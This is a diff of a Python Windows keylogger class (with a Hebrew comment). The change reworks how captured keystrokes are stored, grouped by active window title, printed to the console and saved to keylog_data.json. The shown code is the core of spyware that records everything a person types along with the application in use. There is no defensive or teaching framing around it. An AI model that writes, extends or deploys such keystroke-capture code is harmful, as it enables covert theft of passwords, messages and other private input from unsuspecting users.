@@ -8,7 +8,7 @@ import time
 
 class KeyLogger:
     def __init__(self):
-        self.current_keys = {}
+        self.current_keys = []
         self.lock = threading.Lock()
         self.listener = None
         self.user32 = ctypes.WinDLL('user32', use_last_error=True)
@@ -71,12 +71,12 @@ class KeyLogger:
                 if key_str:
                     window_name = self.get_active_window()
                     timestamp = time.strftime("%Y-%m-%d %H:%M")  # שמירת זמן ברמת דקה
-                    if window_name not in self.current_keys:
-                        self.current_keys[window_name] = {}
-                    if timestamp not in self.current_keys[window_name]:
-                        self.current_keys[window_name][timestamp] = ""
-                    self.current_keys[window_name][timestamp] += key_str
-                    print(f"{window_name} [{timestamp}]: {key_str}")
+                    if not self.current_keys or window_name not in self.current_keys[-1]:
+                        self.current_keys.append({window_name: key_str})
+                    else:
+                        self.current_keys[-1][window_name] += key_str
+
+                    print(f"{window_name} : {key_str}")
                     self.save_data()
             except Exception as e:
                 print(f"Error handling key: {e}")
@@ -123,6 +123,7 @@ class KeyLogger:
         with open("keylog_data.json", "w", encoding="utf-8") as f:
             json.dump(self.current_keys, f, ensure_ascii=False, indent=4)
 
+#
 # if __name__ == "__main__":
 #     logger = KeyLogger().start_logging()
 #     try:
